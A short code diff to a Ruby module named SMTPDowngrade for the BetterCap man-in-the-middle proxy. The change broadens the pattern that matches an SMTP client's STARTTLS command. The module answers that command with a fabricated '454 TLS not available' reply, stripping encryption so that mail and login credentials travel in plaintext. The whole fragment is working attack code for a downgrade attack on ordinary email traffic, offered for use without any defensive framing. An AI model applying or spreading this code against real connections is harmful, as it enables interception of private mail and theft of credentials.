@@ -30,7 +30,7 @@ class SMTPDowngrade < BetterCap::Proxy::TCP::Module
     def smtp_parse_request(event)
         return nil if not event.data
 
-        if event.data =~ /^STARTTLS\s*\r\n/
+        if event.data =~ /^STARTTLS.*/
             BetterCap::Logger.info "[#{'SMTP Downgrade'.green}] Intercepted STARTTLS command."
             @respondwith = "454 4.7.0 TLS not available due to local problem\r\n"
 
